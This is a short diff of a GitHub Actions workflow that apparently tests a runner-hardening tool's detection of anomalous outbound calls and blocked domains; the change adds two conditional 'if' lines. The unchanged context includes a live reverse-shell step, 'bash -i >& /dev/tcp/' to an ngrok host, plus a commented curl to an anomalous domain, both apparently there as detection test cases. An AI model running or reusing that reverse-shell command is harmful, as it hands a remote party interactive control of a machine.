@@ -191,6 +191,7 @@ jobs:
     - run: |
           bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1" 
   anomalous-outbound-calls:
+    if: ${{ github.event.inputs.run_only_anomalous == 'true' || github.event.inputs.enable_anomalous_call == 'true' }}
     # Baseline Generation Script:
     # To quickly run this job 100 times for baseline generation, use this script:
     #
@@ -261,6 +262,7 @@ jobs:
     #     curl -I --max-time 5 "https://$ANOMALOUS_DOMAIN" || true
 
   domain-block:
+    if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
     runs-on: ubuntu-latest
     steps:
     - uses: step-security/harden-runner@rc-20-int
